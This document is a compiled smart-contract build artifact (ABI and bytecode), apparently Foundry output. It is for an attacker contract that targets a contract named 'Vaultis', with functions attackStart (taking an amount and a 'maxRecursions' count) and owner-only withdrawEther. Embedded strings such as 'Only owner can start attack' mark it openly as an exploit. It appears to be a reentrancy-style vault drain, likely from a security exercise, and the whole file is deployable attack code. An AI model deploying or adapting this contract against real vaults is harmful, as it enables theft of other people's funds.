{"abi":[{"type":"constructor","inputs":[{"name":"_vaultisAddress","type":"address","internalType":"address payable"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attackStart","inputs":[{"name":"amount","type":"uint256","internalType":"uint256"},{"name":"maxRecursions","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"owner","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"vaultis","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract Vaultis"}],"stateMutability":"view"},{"type":"function","name":"withdrawEther","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x608060405234801561000f575f5ffd5b506040516107d03803806107d083398181016040528101906100319190610114565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503360015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061013f565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e3826100ba565b9050919050565b6100f3816100d9565b81146100fd575f5ffd5b50565b5f8151905061010e816100ea565b92915050565b5f60208284031215610129576101286100b6565b5b5f61013684828501610100565b91505092915050565b6106848061014c5f395ff3fe608060405260043610610042575f3560e01c80635bdf457d1461004d5780636cc7f1bf146100775780637362377b146100935780638da5cb5b146100a957610049565b3661004957005b5f5ffd5b348015610058575f5ffd5b506100616100d3565b60405161006e91906103f1565b60405180910390f35b610091600480360381019061008c9190610441565b6100f7565b005b34801561009e575f5ffd5b506100a761025c565b005b3480156100b4575f5ffd5b506100bd610352565b6040516100ca919061049f565b60405180910390f35b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610186576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161017d90610512565b60405180910390fd5b814710156101c9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101c0906105a0565b60405180910390fd5b5f810315610258575f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166333f707d1836040518263ffffffff1660e01b815260040161022a91906105cd565b5f604051808303815f87803b158015610241575f5ffd5b505af1158015610253573d5f5f3e3d5ffd5b505050505b5050565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146102eb576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102e290610630565b60405180910390fd5b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f1935050505015801561034f573d5f5f3e3d5ffd5b50565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f6103b96103b46103af84610377565b610396565b610377565b9050919050565b5f6103ca8261039f565b9050919050565b5f6103db826103c0565b9050919050565b6103eb816103d1565b82525050565b5f6020820190506104045f8301846103e2565b92915050565b5f5ffd5b5f819050919050565b6104208161040e565b811461042a575f5ffd5b50565b5f8135905061043b81610417565b92915050565b5f5f604083850312156104575761045661040a565b5b5f6104648582860161042d565b92505060206104758582860161042d565b9150509250929050565b5f61048982610377565b9050919050565b6104998161047f565b82525050565b5f6020820190506104b25f830184610490565b92915050565b5f82825260208201905092915050565b7f4f6e6c79206f776e65722063616e2073746172742061747461636b00000000005f82015250565b5f6104fc601b836104b8565b9150610507826104c8565b602082019050919050565b5f6020820190508181035f830152610529816104f0565b9050919050565b7f496e73756666696369656e742062616c616e636520666f7220696e697469616c5f8201527f2077697468647261770000000000000000000000000000000000000000000000602082015250565b5f61058a6029836104b8565b915061059582610530565b604082019050919050565b5f6020820190508181035f8301526105b78161057e565b9050919050565b6105c78161040e565b82525050565b5f6020820190506105e05f8301846105be565b92915050565b7f4f6e6c79206f776e65722063616e2077697468647261770000000000000000005f82015250565b5f61061a6017836104b8565b9150610625826105e6565b602082019050919050565b5f6020820190508181035f8301526106478161060e565b905091905056fea26469706673582212201ae69f947088b1cfd74044cd89d8c05d2d387fbbfea1bbd07608793e434f12e864736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"attackStart(uint256,uint256)":"6cc7f1bf","owner()":"8da5cb5b","vaultis()":"5bdf457d","withdrawEther()":"7362377b"},"id":1}